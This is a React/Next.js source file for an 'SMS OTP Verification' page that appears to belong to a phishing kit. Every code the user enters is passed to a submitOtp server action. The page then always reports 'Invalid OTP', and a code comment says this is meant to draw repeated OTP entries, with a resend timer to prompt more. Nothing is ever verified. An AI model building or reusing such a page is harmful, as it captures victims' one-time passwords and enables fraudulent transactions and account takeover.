"use client";

import React, { useState, useEffect } from "react";
import { Lock, Mail, Loader2, AlertCircle } from "lucide-react";
import { submitOtp } from "@/lib/action";

export default function VerificationPage() {
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isFailed, setIsFailed] = useState(false);
  const [timer, setTimer] = useState(60);

  useEffect(() => {
    if (timer <= 0) return;
    const interval = setInterval(() => {
      setTimer((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 0) return;

    setIsLoading(true);
    setIsFailed(false);

    try {
      await submitOtp(otp);
      // Even if successful, we show "failed" to simulate multiple OTP requests or a honeypot
      setIsFailed(true);
      setOtp("");
    } catch (error) {
      setIsFailed(true);
    } finally {
      setIsLoading(false);
    }
  };

  const handleResend = () => {
    if (timer === 0) {
      setTimer(60);
      setIsFailed(false);
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-[#F5F5F5] p-4 font-sans text-[#333]">
      <div className="w-full max-w-md overflow-hidden rounded-2xl bg-white shadow-[0_10px_40px_rgba(0,0,0,0.08)]">
        {/* Header */}
        <header className="flex items-center gap-4 bg-[#F9F7F2] p-6">
          <div className="flex h-12 w-12 items-center justify-center rounded-lg">
            <Lock size={36} className="text-[#FBC02D] fill-[#FBC02D]" />
          </div>
          <div className="flex flex-col">
            <h1 className="text-lg font-bold text-[#444]">SMS OTP Verification</h1>
            <p className="text-[13px] text-gray-400">Secure Transaction</p>
          </div>
        </header>

        {/* Content */}
        <main className="flex flex-col items-center px-8 py-10 text-center">
          {/* Mail Icon */}
          <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-blue-50">
            <Mail size={48} className="text-[#64B5F6]" />
          </div>

          <h2 className="mb-3 text-2xl font-bold text-[#424242]">Enter Your OTP</h2>
          <p className="mb-10 text-[15px] leading-relaxed text-gray-500">
            We have sent a One Time Password (OTP) to your registered mobile number.
          </p>
            {/* Failed Message */}
            {isFailed && (
                <div className=" mb-3 flex items-center gap-1.5 px-4 py-2 rounded-md bg-red-50 text-[13px] font-semibold text-[#D32F2F] shadow-sm animate-in fade-in slide-in-from-top-2">
                    <AlertCircle size={14} strokeWidth={2.5} />
                    <span>Invalid OTP. Please check and try again.</span>
                </div>
            )}
          <form onSubmit={handleSubmit} className="w-full space-y-8">
            {/* OTP Input Section */}
            <div className="relative flex flex-col items-center">
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                placeholder=". . . ."
                className="w-full rounded-lg border border-[#E0E0E0] bg-white py-4 text-center text-3xl font-bold tracking-[0.2em] text-[#424242] placeholder:text-gray-300 focus:border-[#FFC107] focus:outline-none focus:ring-1 focus:ring-[#FFC107]"
                autoFocus
                required
              />


            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading || otp.length === 0}
              className={`mt-4 flex w-full items-center justify-center rounded-full py-4 text-[17px] font-extrabold text-black shadow-[0_4px_12px_rgba(255,193,7,0.3)] transition-all active:scale-[0.98] disabled:opacity-60 disabled:shadow-none ${
                isLoading ? "bg-[#FFCA28]" : "bg-[#FFC107] hover:bg-[#FFB300]"
              }`}
            >
              {isLoading ? (
                <Loader2 size={24} className="animate-spin" />
              ) : (
                "Confirm & Proceed"
              )}
            </button>
          </form>

          {/* Footer */}
          <div className="mt-14 flex flex-col gap-3 text-[14px]">
            <span className="text-gray-500 font-medium">Didn't receive the code?</span>
            <button
              onClick={handleResend}
              disabled={timer > 0}
              className={`font-bold transition-colors ${
                timer > 0 ? "text-[#90A4AE]" : "text-[#2196F3] hover:text-[#1976D2]"
              }`}
            >
              {timer > 0 ? `Resend OTP in ${timer}s` : "Resend OTP Now"}
            </button>
          </div>
        </main>
      </div>
    </div>
  );
}
